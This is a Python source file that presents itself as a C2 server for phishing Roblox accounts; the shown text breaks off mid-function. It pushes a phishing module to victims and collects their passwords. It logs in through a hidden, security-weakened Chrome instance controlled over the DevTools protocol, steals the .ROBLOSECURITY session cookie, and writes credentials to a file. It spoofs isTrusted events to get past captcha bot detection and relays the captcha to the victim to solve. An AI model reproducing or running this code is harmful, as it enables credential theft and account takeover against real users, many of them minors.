"""
c2_server.py — C2 + browser streaming hybrid.
Chrome starts ONLY after victim enters password.
Flow:
1. Start WebSocket server (no Chrome)
2. Client connects → send phish.lua module
3. Victim enters password → Chrome starts, CDP connect
4. Login attempt via CDP (fill form, submit)
5. If .ROBLOSECURITY cookie → success, kill Chrome
6. If captcha → stream Chrome to Roblox until cookie or timeout
7. Kill Chrome when done
"""

import asyncio
import websockets
import json
import base64
import struct
import subprocess
import time
import logging
import os
import random
import requests
import ctypes
from io import BytesIO
from PIL import Image

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
log = logging.getLogger(__name__)

CREDENTIALS_FILE = os.path.abspath("c2_credentials.txt")

def save_credentials(username, password, cookie_value, cookie_domain=""):
    try:
        with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f".ROBLOSECURITY: {cookie_value}\n")
            if cookie_domain:
                f.write(f"Domain: {cookie_domain}\n")
            f.write("\n")
        log.info(f"Credentials saved to {CREDENTIALS_FILE}")
    except Exception as e:
        log.error(f"Failed to save credentials: {e}")

CHUNK_SIZE = 128
CDP_PORT = 9222
WS_PORT = 8081
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
PROFILE = os.path.abspath("pw_profile")
BROWSER_WIDTH = 800
BROWSER_HEIGHT = 600
MODULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")

TRUSTED_PATCH_SCRIPT = r"""(() => {
    if (window.__trustedPatched) return;
    Object.defineProperty(window, '__trustedPatched', {value: true, writable: false, configurable: false});
    try { Object.defineProperty(navigator, 'webdriver', {get: () => undefined}); } catch(e) {}
    const orig = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, listener, options) {
        const wrapper = function(event) {
            const proxy = new Proxy(event, {
                get(t, p, r) {
                    if (p === 'isTrusted') return true;
                    return Reflect.get(t, p, r);
                },
                has(t, p) {
                    if (p === 'isTrusted') return true;
                    return Reflect.has(t, p);
                },
                ownKeys(t) {
                    const keys = Reflect.ownKeys(t);
                    if (!keys.includes('isTrusted')) keys.push('isTrusted');
                    return keys;
                },
                getOwnPropertyDescriptor(t, p) {
                    if (p === 'isTrusted') return {configurable: true, enumerable: true, value: true};
                    return Reflect.getOwnPropertyDescriptor(t, p);
                }
            });
            return listener.call(this, proxy);
        };
        return orig.call(this, type, wrapper, options);
    };
})()"""

# WinAPI structures for OS-level mouse click (SendInput)
PUL = ctypes.POINTER(ctypes.c_ulong)

class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx", ctypes.c_long),
        ("dy", ctypes.c_long),
        ("mouseData", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", PUL),
    ]

class INPUT(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_ulong),
        ("mi", MOUSEINPUT),
    ]

INPUT_MOUSE = 0
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_ABSOLUTE = 0x8000
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004

user32 = ctypes.windll.user32


def send_os_move(screen_x, screen_y):
    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)
    nx = int(screen_x * 65535 / sw)
    ny = int(screen_y * 65535 / sh)
    inp = INPUT(INPUT_MOUSE, MOUSEINPUT(nx, ny, 0, MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, 0, None))
    return user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT)) == 1

def send_os_down_nomove(screen_x, screen_y):
    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)
    nx = int(screen_x * 65535 / sw)
    ny = int(screen_y * 65535 / sh)
    inp = INPUT(INPUT_MOUSE, MOUSEINPUT(nx, ny, 0, MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, 0, None))
    return user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT)) == 1

def send_os_up_nomove(screen_x, screen_y):
    sw = user32.GetSystemMetrics(0)
    sh = user32.GetSystemMetrics(1)
    nx = int(screen_x * 65535 / sw)
    ny = int(screen_y * 65535 / sh)
    inp = INPUT(INPUT_MOUSE, MOUSEINPUT(nx, ny, 0, MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, 0, None))
    return user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT)) == 1


async def bring_window_foreground(hwnd):
    # Try multiple passes with delays for OS foreground switch to settle
    for attempt in range(8):
        fore = user32.GetForegroundWindow()
        if fore == hwnd:
            return True
        fore = fore or 0
        tid_fore = user32.GetWindowThreadProcessId(fore, None)
        tid_target = user32.GetWindowThreadProcessId(hwnd, None)
        if tid_fore == 0 or tid_fore == tid_target:
            user32.SetForegroundWindow(hwnd)
        else:
            user32.AttachThreadInput(tid_fore, tid_target, True)
            user32.SetForegroundWindow(hwnd)
            user32.AttachThreadInput(tid_fore, tid_target, False)
        user32.SwitchToThisWindow(hwnd, True)
        user32.BringWindowToTop(hwnd)
        user32.ShowWindow(hwnd, 5)
        user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, 0x0002 | 0x0001)
        if user32.GetForegroundWindow() == hwnd:
            await asyncio.sleep(0.02)
            return True
        await asyncio.sleep(0.06)
    log.warning(f"Failed to bring hwnd={hwnd} to foreground, cur_fore={user32.GetForegroundWindow()}")
    return False

def find_chrome_hwnd(pid):
    from ctypes import wintypes
    main_hwnd = None
    # Step 1: find the main Chrome window
    @ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    def enum_main(hwnd, lParam):
        nonlocal main_hwnd
        pid_out = wintypes.DWORD()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid_out))
        if pid_out.value == pid:
            buf = ctypes.create_unicode_buffer(128)
            user32.GetClassNameW(hwnd, buf, 128)
            if "Chrome_WidgetWin" in buf.value:
                rect = wintypes.RECT()
                user32.GetClientRect(hwnd, ctypes.byref(rect))
                if rect.right > 0 and rect.bottom > 0:
                    main_hwnd = hwnd
                    return False
        return True
    user32.EnumWindows(enum_main, 0)

    # Step 2: search children for the render widget
    if main_hwnd:
        render_hwnd = [None]
        @ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
        def enum_child(hwnd, lParam):
            buf = ctypes.create_unicode_buffer(128)
            user32.GetClassNameW(hwnd, buf, 128)
            if buf.value == "Chrome_RenderWidgetHostHWND":
                rect = wintypes.RECT()
                user32.GetClientRect(hwnd, ctypes.byref(rect))
                if rect.right > 0 and rect.bottom > 0:
                    render_hwnd[0] = hwnd
                    return False
            return True
        user32.EnumChildWindows(main_hwnd, enum_child, 0)
        if render_hwnd[0]:
            log.info(f"Found render widget HWND={render_hwnd[0]}")
            return render_hwnd[0]
        log.info(f"No render widget found, using main HWND={main_hwnd}")
    return main_hwnd


def get_viewport_screen_pos(hwnd):
    from ctypes import wintypes
    rect = wintypes.RECT()
    if not user32.GetClientRect(hwnd, ctypes.byref(rect)):
        return None
    pt = wintypes.POINT(wintypes.LONG(rect.left), wintypes.LONG(rect.top))
    if not user32.ClientToScreen(hwnd, ctypes.byref(pt)):
        return None
    return (pt.x, pt.y)


def start_chrome():
    ext_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "extension"))
    args = [
        CHROME,
        f"--user-data-dir={PROFILE}",
        "--no-first-run",
        "--no-default-browser-check",
        f"--load-extension={ext_path}",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        f"--window-size={BROWSER_WIDTH},{BROWSER_HEIGHT}",
        "--window-position=-4000,-4000",
        "--disable-web-security",
        "--disable-site-isolation-trials",
        "--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI,InterestFeedContentSuggestions,TranslateUI",
        "--disable-blink-features=AutomationControlled",
        "--enable-gpu-benchmarking",
        "--disable-sync",
        "--disable-background-networking",
        "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows",
        "--disable-renderer-backgrounding",
        "--mute-audio",
        "--force-device-scale-factor=1",
    ]
    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


async def get_cdp_url(max_attempts=30):
    import http.client
    for attempt in range(max_attempts):
        try:
            conn = http.client.HTTPConnection("localhost", CDP_PORT, timeout=3)
            conn.request("GET", "/json")
            resp = conn.getresponse()
            tabs = json.loads(resp.read())
            conn.close()
            if tabs:
                url = tabs[0]["webSocketDebuggerUrl"]
                log.info(f"CDP URL: {url}")
                return url
        except Exception as e:
            log.warning(f"Waiting for Chrome CDP ({attempt}): {e}")
        await asyncio.sleep(1)
    raise RuntimeError("Could not connect to Chrome CDP")


def load_module(name):
    path = os.path.join(MODULES_DIR, name)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


class ScreenStream:
    def __init__(self):
        self.chrome_proc = None
        self.cdp = None
        self._msg_id = 0
        self._pending = {}
        self.frame_queue = asyncio.Queue(maxsize=4)
        self._reader_task = None
        self._capture_task = None
        self._stream_task = None
        self._capture_clip = None
        self._last_username = None
        self._last_password = None
        self._tries = 0
        self._text_mode = False
        self._captcha_frame_id = None
        self._captcha_mode = False
        self._target_session_id = None
        self._session_pending = {}
        self._auto_sessions = {}
        self._viewport_pos = None
        self._chrome_top_height = 0
        self._win_bounds = {}
        self._main_hwnd = None
        self._mouse_pressed = False
        self._off_screen = False
        self._use_os_click = False  # False = CDP-only (C), True = hybrid CDP move + OS click (D)

    async def ensure_chrome(self):
        if self.cdp:
            return True

        # If we had a previous Chrome instance, kill it first
        if self.chrome_proc:
            try:
                self.chrome_proc.kill()
                self.chrome_proc.wait(timeout=3)
            except Exception:
                pass
            self.chrome_proc = None

        # Start fresh Chrome
        try:
            self.chrome_proc = start_chrome()
            log.info("Chrome process started")

            url = await get_cdp_url(max_attempts=30)
            self.cdp = await websockets.connect(url, max_size=None)
            log.info("Connected to Chrome CDP")

            self._reader_task = asyncio.create_task(self._reader())

            # Measure actual chrome decoration height BEFORE device metrics override
            self._chrome_top_height = 0
            self._win_bounds = {}
            try:
                win = await self._cmd("Browser.getWindowForTarget")
                self._win_bounds = win.get("bounds", {})
                wid = win.get("windowId")
                log.info(f"Browser window bounds: {self._win_bounds} windowId={wid}")
                # Now get chrome height from JS (before override)
                result = await self._cmd("Runtime.evaluate", {
                    "expression": "window.outerHeight - window.innerHeight"
                })
                self._chrome_top_height = result.get("result", {}).get("value", 0)
                log.info(f"Chrome top height: {self._chrome_top_height}")
            except Exception as e:
                log.warning(f"Failed to measure chrome metrics: {e}")

            await self._cmd("Network.enable")
            await self._cmd("Emulation.setDeviceMetricsOverride", {
                "width": BROWSER_WIDTH, "height": BROWSER_HEIGHT,
                "deviceScaleFactor": 1, "mobile": False,
            })
            await self._cmd("Target.setAutoAttach", {"autoAttach": True, "flatten": True, "waitForDebuggerOnStart": False})
            # Inject isTrusted patch for root session (main page + in-process iframes)
            try:
                await self._cmd("Page.addScriptToEvaluateOnNewDocument", {"source": TRUSTED_PATCH_SCRIPT})
                log.info("Injected isTrusted patch via addScriptToEvaluateOnNewDocument (root)")
            except Exception as e:
                log.warning(f"addScriptToEvaluateOnNewDocument root failed: {e}")
            log.info(f"Viewport set to {BROWSER_WIDTH}x{BROWSER_HEIGHT}")

            # Resize Chrome window via WinAPI to ensure viewport fits
            try:
                for _ in range(20):
                    hwnd = find_chrome_hwnd(self.chrome_proc.pid)
                    if hwnd:
                        break
                    await asyncio.sleep(0.25)
                if hwnd:
                    self._main_hwnd = hwnd
                    from ctypes import wintypes
                    outer_w = BROWSER_WIDTH
                    outer_h = BROWSER_HEIGHT + self._chrome_top_height
                    if self._text_mode:
                        # Studio mode: position off-screen (no visible window, no focus steal)
                        new_left = -4000
                        new_top = -4000
                        self._off_screen = True
                        log.info("Studio mode: Chrome off-screen")
                    else:
                        sw = user32.GetSystemMetrics(0)
                        sh = user32.GetSystemMetrics(1)
                        new_left = max(0, (sw - outer_w) // 4)
                        new_top = max(0, (sh - outer_h) // 4)
                    user32.SetWindowPos(hwnd, 0, new_left, new_top, outer_w, outer_h, 0x0040)
                    log.info(f"Window resized via WinAPI: ({new_left},{new_top}) {outer_w}x{outer_h}")
            except Exception as e:
                log.warning(f"WinAPI resize failed (non-critical): {e}")

            return True
        except Exception as e:
            log.error(f"Failed to start Chrome: {e}")
            return False

    def kill_chrome(self):
        if self._capture_task:
            self._capture_task.cancel()
            self._capture_task = None
        if self._reader_task and not self._reader_task.done():
            self._reader_task.cancel()
            self._reader_task = None
        if self.cdp:
            asyncio.ensure_future(self.cdp.close())
            self.cdp = None
        if self.chrome_proc:
            try:
                self.chrome_proc.kill()
            except Exception:
                pass
            self.chrome_proc = None
        self._pending = {}
        self.frame_queue = asyncio.Queue(maxsize=4)
        self._capture_clip = None
        log.info("Chrome killed")

    async def _reader(self):
        try:
            async for msg in self.cdp:
                data = json.loads(msg)
                if data.get("method") == "Target.attachedToTarget":
                    p = data.get("params", {})
                    tid = p.get("targetInfo", {}).get("targetId", "")
                    sid = p.get("sessionId", "")
                    url = p.get("targetInfo", {}).get("url", "")
                    if tid and sid:
                        self._auto_sessions[tid] = sid
                        log.info(f"Auto-attached to target {tid} session={sid} url={url}")
                        if "arkoselabs" in url or "funcaptcha" in url:
                            self._target_session_id = sid
                            await self._cmd("Page.addScriptToEvaluateOnNewDocument", {"source": TRUSTED_PATCH_SCRIPT}, session_id=sid, wait=False)
                            await self._inject_is_trusted()
                    continue
                if "sessionId" in data:
                    sid_key = (data["sessionId"], data.get("id"))
                    future = self._session_pending.pop(sid_key, None)
                    if future and not future.done():
                        if "error" in data:
                            future.set_exception(RuntimeError(data["error"]))
                        else:
                            future.set_result(data.get("result", {}))
                elif "id" in data:
                    future = self._pending.pop(data["id"], None)
                    if future and not future.done():
                        if "error" in data:
                            future.set_exception(RuntimeError(data["error"]))
                        else:
                            future.set_result(data.get("result", {}))
        except Exception as e:
            log.error(f"CDP reader error: {e}")
            for fid, future in self._pending.items():
                if not future.done():
                    future.set_exception(RuntimeError("CDP connection lost"))
            for sid, future in self._session_pending.items():
                if not future.done():
                    future.set_exception(RuntimeError("CDP connection lost"))
            self._pending.clear()
            self._session_pending.clear()

    async def _cmd(self, method, params=None, wait=True, session_id=None):
        self._msg_id += 1
        msg_id = self._msg_id
        future = asyncio.get_event_loop().create_future() if wait else None
        msg = {"id": msg_id, "method": method, "params": params or {}}
        if session_id:
            msg["sessionId"] = session_id
            if future:
                self._session_pending[(session_id, msg_id)] = future
        elif future:
            self._pending[msg_id] = future
        await self.cdp.send(json.dumps(msg))
        if future:
            result = await asyncio.wait_for(future, timeout=15.0)
            return result

    async def _capture_loop(self):
        while True:
            try:
                params = {"format": "png"}
                if self._capture_clip:
                    params["clip"] = {**self._capture_clip, "scale": 1}
                result = await self._cmd("Page.captureScreenshot", params)
                await self.frame_queue.put(result)
            except asyncio.TimeoutError:
                log.warning("Screenshot timeout")
            except Exception as e:
                log.error(f"Capture error: {e}")
            await asyncio.sleep(0.5)

    def start_capture(self):
        if self._capture_task is None:
            self._capture_task = asyncio.create_task(self._capture_loop())
            log.info("Capture loop started")

    def stop_capture(self):
        if self._capture_task:
            self._capture_task.cancel()
            self._capture_task = None
            log.info("Capture loop stopped")
        self._capture_clip = None

    async def _find_captcha_frame_id(self):
        tree = await self._cmd("Page.getFrameTree")
        def search(f):
            if "iframe" in f.get("frame", {}).get("url", "") or "arkoselabs" in f.get("frame", {}).get("url", "") or "funcaptcha" in f.get("frame", {}).get("url", ""):
                return f["frame"]["id"]
            for c in f.get("childFrames", []):
                r = search(c)
                if r:
                    return r
            return None
        return search(tree.get("frameTree", {}))

    async def attach_to_captcha_frame(self):
        if not self._captcha_frame_id:
            return
        # First check if auto-attach already gave us a session
        if self._captcha_frame_id in self._auto_sessions:
            self._target_session_id = self._auto_sessions[self._captcha_frame_id]
            log.info(f"Using auto-attached session for captcha frame: {self._target_session_id}")
            # addScriptToEvaluateOnNewDocument was already called by auto-attach handler,
            # but _inject_is_trusted is redundant fallback for safety
            await self._inject_is_trusted()
            return
        # Try OOPIF approach
        for attempt in range(15):
            try:
                targets = await self._cmd("Target.getTargets")
                for t in targets.get("targetInfos", []):
                    url = t.get("url", "")
                    tid = t.get("targetId", "")
                    if "arkoselabs" in url or "funcaptcha" in url:
                        result = await self._cmd("Target.attachToTarget", {"targetId": tid, "flatten": True})
                        self._target_session_id = result.get("sessionId")
                        log.info(f"Found captcha OOPIF target: {tid}, session={self._target_session_id}")
                        await self._inject_is_trusted()
                        # Verify patch injection
                        patched_check = await self._cmd("Runtime.evaluate", {
                            "expression": "window.__trustedPatched === true",
                            "returnByValue": True
                        })
                        log.info(f"Captcha frame __trustedPatched: {patched_check}")
                        return
                await asyncio.sleep(0.5)
            except Exception as e:
                await asyncio.sleep(0.5)
        log.warning("Captcha frame has no CDP session available - clicks will not reach it")

    async def _inject_is_trusted(self):
        if not self._target_session_id:
            return
        await self._cmd("Runtime.evaluate", {
            "expression": TRUSTED_PATCH_SCRIPT
        }, session_id=self._target_session_id, wait=False)
        log.info(f"Injected isTrusted patch into OOPIF session {self._target_session_id}")

    async def _get_viewport_pos(self):
        if self._viewport_pos:
            return self._viewport_pos
        if not self.chrome_proc or not self.chrome_proc.pid:
            return None

        # Use main HWND saved at startup, or try to re-find it
        from ctypes import wintypes
        main_hwnd = self._main_hwnd
        if not main_hwnd:
            pid = self.chrome_proc.pid
            @ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
            def enum_main(hwnd, lParam):
                nonlocal main_hwnd
                pid_out = wintypes.DWORD()
                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid_out))
                if pid_out.value == pid:
                    buf = ctypes.create_unicode_buffer(128)
                    user32.GetClassNameW(hwnd, buf, 128)
                    if "Chrome_WidgetWin" in buf.value:
                        rect = wintypes.RECT()
                        user32.GetClientRect(hwnd, ctypes.byref(rect))
                        if rect.right >= BROWSER_WIDTH and rect.bottom >= BROWSER_HEIGHT:
                            main_hwnd = hwnd
                            return False
                return True
            user32.EnumWindows(enum_main, 0)

        # Method 1: Combined WinAPI + CDP for most accurate viewport position
        try:
            if main_hwnd and self._chrome_top_height:
                # Window rect (outer position including non-client decorations)
                win_rect = wintypes.RECT()
                user32.GetWindowRect(main_hwnd, ctypes.byref(win_rect))
                # Client area top-left on screen
                client_pt = wintypes.POINT(wintypes.LONG(0), wintypes.LONG(0))
                user32.ClientToScreen(main_hwnd, ctypes.byref(client_pt))
                # Client area size
                client_rect = wintypes.RECT()
                user32.GetClientRect(main_hwnd, ctypes.byref(client_rect))

                client_left = client_pt.x
                client_top = client_pt.y
                client_bottom = client_top + client_rect.bottom
                win_left = win_rect.left
                win_top = win_rect.top
                win_bottom = win_rect.bottom

                # Non-client borders (title bar + window frame)
                non_client_top = client_top - win_top
                non_client_bottom = win_bottom - client_bottom

                # Chrome UI inside client area above viewport:
                # total_chrome_ht = non_client_top + tabs_address_bar + non_client_bottom
                # => tabs_address_bar = total_chrome_ht - non_client_top - non_client_bottom
                above_viewport = self._chrome_top_height - non_client_top - non_client_bottom

                if above_viewport >= 0:
                    vp_x = max(0, client_left)
                    vp_y = max(0, client_top + above_viewport)
                    self._viewport_pos = (vp_x, vp_y)
                    log.info(f"Viewport pos: win_rect=({win_left},{win_top})-({win_rect.right},{win_bottom}) "
                             f"client=({client_left},{client_top}) "
                             f"chrome_total={self._chrome_top_height} "
                             f"non_client_top={non_client_top} non_client_bot={non_client_bottom} "
                             f"above_viewport={above_viewport} -> {self._viewport_pos}")
                    return self._viewport_pos
        except Exception as e:
            log.warning(f"Combined viewport calc failed: {e}")

        # Method 2: CDP-only (less accurate, includes non-client in chrome_top)
        try:
            bounds = self._win_bounds
            if bounds:
                win_left = bounds.get("left", 0)
                win_top = bounds.get("top", 0)
                chrome_top = self._chrome_top_height or 0
                vp_x = max(0, win_left)
                vp_y = max(0, win_top + chrome_top)
                self._viewport_pos = (vp_x, vp_y)
                log.info(f"Viewport screen pos (CDP fallback): ({win_left},{win_top}) chrome_top={chrome_top} -> {self._viewport_pos}")
                return self._viewport_pos
        except Exception as e:
            log.warning(f"CDP fallback failed: {e}")

        # Method 3: WinAPI-only fallback (client area = viewport, ignores chrome UI offset)
        try:
            if main_hwnd:
                buf = ctypes.create_unicode_buffer(128)
                user32.GetClassNameW(main_hwnd, buf, 128)
                log.info(f"Fallback: HWND={main_hwnd} class={buf.value}")
                pos = get_viewport_screen_pos(main_hwnd)
                if pos:
                    self._viewport_pos = pos
                    log.info(f"Viewport screen pos (WinAPI fallback): {self._viewport_pos}")
        except Exception as e2:
            log.warning(f"WinAPI fallback failed: {e2}")
        return self._viewport_pos

    async def dispatch_mouse(self, x, y, event_type):
        cdp_types = {0: "mouseMoved", 1: "mousePressed", 2: "mousePressed", 3: "mouseReleased", 4: "mouseReleased", 5: "mouseWheel", 6: "mouseWheel"}
        cdp_buttons = {1: "left", 2: "right", 3: "left", 4: "right"}

        if self._capture_clip:
            clip_x = int(self._capture_clip["x"])
            clip_y = int(self._capture_clip["y"])
            max_w = int(self._capture_clip["width"])
            max_h = int(self._capture_clip["height"])
            x = clip_x + max(0, min(x, max_w - 1))
            y = clip_y + max(0, min(y, max_h - 1))
        else:
            max_w = BROWSER_WIDTH
            max_h = BROWSER_HEIGHT
            x = max(0, min(x, max_w - 1))
            y = max(0, min(y, max_h - 1))

        if event_type in (5, 6):
            params = {
                "type": "mouseWheel",
                "x": float(x), "y": float(y),
                "deltaX": 0, "deltaY": 120 if event_type == 5 else -120,
            }
            result = await self._cmd("Input.dispatchMouseEvent", params)
            log.info(f"Mouse dispatch: ({x},{y}) type={event_type} -> result={result}")
            return

        # Captcha: dispatch on ROOT CDP (trusted events, Chrome routes to correct frame)
        if self._captcha_mode and event_type in (0, 1, 2, 3, 4):
            params = {
                "type": cdp_types.get(event_type, "mouseMoved"),
                "x": float(x), "y": float(y),
                "button": "none", "modifiers": 0, "pointerType": "mouse",
            }
            if event_type in (1, 2, 3, 4):
                params["button"] = "left"
                params["buttons"] = 1
                params["clickCount"] = 1
            result = await self._cmd("Input.dispatchMouseEvent", params)
            log.info(f"CDP captcha click: ({x},{y}) type={event_type} -> {result}")
            return

        params = {
            "type": cdp_types.get(event_type, "mouseMoved"),
            "x": float(x), "y": float(y),
            "modifiers": 0,
            "pointerType": "mouse",
        }
        if event_type == 0:
            params["button"] = "none"
        else:
            params["button"] = cdp_buttons.get(event_type, "left")
            params["clickCount"] = 1
            params["buttons"] = 1

        if event_type in (1, 2, 3, 4):
            await self._cmd("Page.bringToFront", wait=False)

        result = await self._cmd("Input.dispatchMouseEvent", params)
        log.info(f"Mouse dispatch: ({x},{y}) type={event_type} -> result={result}")

    async def dispatch_key(self, ev_type, key):
        cdp_types = {0: "rawKeyDown", 1: "keyUp", 2: "char"}
        t = cdp_types.get(ev_type, "rawKeyDown")
        params = {"type": t, "key": key, "code": key, "windowsVirtualKeyCode": 0}
        if t == "char":
            params["text"] = key
            params["unmodifiedText"] = key
        elif t == "rawKeyDown":
            params["windowsVirtualKeyCode"] = ord(key[0]) if len(key) == 1 else 0
        await self._cmd("Input.dispatchKeyEvent", params)
        log.info(f"Key dispatch: type={t} key={key}")

    async def dispatch_text(self, text):
        await self._cmd("Input.insertText", {"text": text})
        log.info(f"Text insert: {text[:50]}")

    async def _ws_send(self, ws, msg):
        if self._text_mode:
            b64 = base64.b64encode(msg).decode('ascii')
            await ws.send(json.dumps({"__bin__": b64}))
        else:
            await ws.send(msg)

    async def _send_frame(self, ws, img, prev_image):
        w, h = img.size
        chunks_x = (w + CHUNK_SIZE - 1) // CHUNK_SIZE
        chunks_y = (h + CHUNK_SIZE - 1) // CHUNK_SIZE

        if prev_image is None or prev_image.size != img.size:
            msg = struct.pack("<BII", 0, w, h)
            await self._ws_send(ws, msg)
            log.info(f"Sent Resize {w}x{h}")
            for cx in range(chunks_x):
                for cy in range(chunks_y):
                    ox = cx * CHUNK_SIZE
                    oy = cy * CHUNK_SIZE
                    cw = min(CHUNK_SIZE, w - ox)
                    ch = min(CHUNK_SIZE, h - oy)
                    chunk = img.crop((ox, oy, ox + cw, oy + ch))
                    data = chunk.tobytes()
                    msg = struct.pack("<BBBI", 1, cx, cy, len(data)) + data
                    await self._ws_send(ws, msg)
            log.info(f"Sent {chunks_x * chunks_y} chunks")
        else:
            changed = 0
            for cx in range(chunks_x):
                for cy in range(chunks_y):
                    ox = cx * CHUNK_SIZE
                    oy = cy * CHUNK_SIZE
                    cw = min(CHUNK_SIZE, w - ox)
                    ch = min(CHUNK_SIZE, h - oy)
                    chunk = img.crop((ox, oy, ox + cw, oy + ch))
                    prev_chunk = prev_image.crop((ox, oy, ox + cw, oy + ch))
                    if chunk.tobytes() != prev_chunk.tobytes():
                        data = chunk.tobytes()
                        msg = struct.pack("<BBBI", 1, cx, cy, len(data)) + data
                        await self._ws_send(ws, msg)
                        changed += 1
            if changed > 0:
                log.info(f"Sent {changed} changed chunks")
        return img

    async def stream_to_client(self, ws):
        prev_image = None
        frame_count = 0
        while True:
            try:
                result = await asyncio.wait_for(self.frame_queue.get(), timeout=15.0)
            except asyncio.TimeoutError:
                log.warning("No frames from CDP for 15s")
                continue
            png_data = base64.b64decode(result["data"])
            img = Image.open(BytesIO(png_data)).convert("RGBA")
            if img.size != (BROWSER_WIDTH, BROWSER_HEIGHT) and not self._capture_clip:
                img = img.resize((BROWSER_WIDTH, BROWSER_HEIGHT), Image.LANCZOS)
            frame_count += 1
            log.info(f"Streaming frame {frame_count}: {img.size[0]}x{img.size[1]}")
            try:
                prev_image = await self._send_frame(ws, img, prev_image)
            except websockets.exceptions.ConnectionClosed:
                log.info("Client disconnected during frame send")
                break
            except Exception as e:
                log.error(f"Frame send error: {e}")
                break

    async def _wait_for_element(self, selector, timeout=15):
        for i in range(timeout * 10):
            result = await self._cmd("Runtime.evaluate", {
                "expression": f"document.querySelector({json.dumps(selector)}) !== null"
            })
            if result.get("result", {}).get("value"):
                return True
            if i % 50 == 0:
                title = await self._cmd("Runtime.evaluate", {
                    "expression": "document.title || 'no title'"
                })
                log.info(f"Waiting for '{selector}' (attempt {i}): {title.get('result',{}).get('value','')}")
            await asyncio.sleep(0.1)
        return False

    async def set_captcha_clip(self):
        import json
        for i in range(100):
            result = await self._cmd("Runtime.evaluate", {
                "expression": """(() => {
                    const sel = [
                        'iframe[src*="arkoselabs"]', 'iframe[src*="funcaptcha"]',
                        '[id*="funcaptcha"]', 'iframe[title*="captcha"]',
                        '#arkose-iframe', '[data-pk]',
                        '.h-captcha', 'iframe[src*="hcaptcha"]',
                        '[class*="captcha"]', '[id*="captcha"]', '.captcha-holder',
                        '[data-px-captcha]',
                    ];
                    try {
                        const all_iframes = document.querySelectorAll('iframe');
                        let found_captcha_iframe = false;
                        for (const iframe of all_iframes) {
                            let pk = iframe.getAttribute('data-pk');
                            const src = (iframe.getAttribute('src') || '').toLowerCase();
                            if (pk || src.includes('arkoselabs') || src.includes('funcaptcha') || src.includes('arkose')) {
                                found_captcha_iframe = true;
                                const r = iframe.getBoundingClientRect();
                                if (r.width > 10 && r.height > 10) {
                                    iframe.scrollIntoView({block:'center'});
                                    return JSON.stringify({x: r.x, y: r.y, width: r.width, height: r.height});
                                }
                            }
                        }
                        if (found_captcha_iframe) return 'null';
                        for (const s of sel) {
                            const el = document.querySelector(s);
                            if (el) {
                                const r = el.getBoundingClientRect();
                                if (r.width > 10 && r.height > 10 && r.width < window.innerWidth*0.9 && r.height < window.innerHeight*0.9) {
                                    el.scrollIntoView({block:'center'});
                                    return JSON.stringify({x: r.x, y: r.y, width: r.width, height: r.height});
                                }
                            }
                        }
                        for (const iframe of all_iframes) {
                            const r = iframe.getBoundingClientRect();
                            if (r.width > 50 && r.height > 50 && r.width < window.innerWidth*0.95 && r.height < window.innerHeight*0.95) {
                                iframe.scrollIntoView({block:'center'});
                                return JSON.stringify({x: r.x, y: r.y, width: r.width, height: r.height});
                            }
                        }
                    } catch(e) {}
                    return 'null';
                })()"""
            })
            raw = result.get("result", {}).get("value", "null")
            if raw and raw != "null":
                clip = json.loads(raw)
                clip["x"] = int(clip["x"])
                clip["y"] = int(clip["y"])
                clip["width"] = int(clip["width"])
                clip["height"] = int(clip["height"])
                if clip["x"] < 0: clip["x"] = 0
                if clip["y"] < 0: clip["y"] = 0
                if clip["x"] + clip["width"] > BROWSER_WIDTH:
                    clip["width"] = BROWSER_WIDTH - clip["x"]
                if clip["y"] + clip["height"] > BROWSER_HEIGHT:
                    clip["height"] = BROWSER_HEIGHT - clip["y"]
                self._capture_clip = clip
                self._captcha_frame_id = await self._find_captcha_frame_id()
                log.info(f"Captcha clip found: {clip} frame={self._captcha_frame_id}")
                return True
            await asyncio.sleep(0.2)
        log.warning("Captcha element not found after 20s, streaming full viewport")
        return False

    async def hide_form_for_captcha(self):
        await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                if (document.getElementById('__c2_hide')) return 'ok';
                const s = document.createElement('style');
                s.id = '__c2_hide';
                s.textContent = `
                    form, input, button, textarea, select,
                    [class*="login"], [class*="form"],
                    [class*="header"], [class*="footer"],
                    [class*="alert"], .metadata, nav
                    { display: none !important; }
                    html, body {
                        background: #e8e8e8 !important;
                        margin: 0 !important;
                    }
                `;
                document.head.appendChild(s);
                let c = document.querySelector('iframe[src*="arkoselabs"], iframe[src*="funcaptcha"]');
                if (c) {
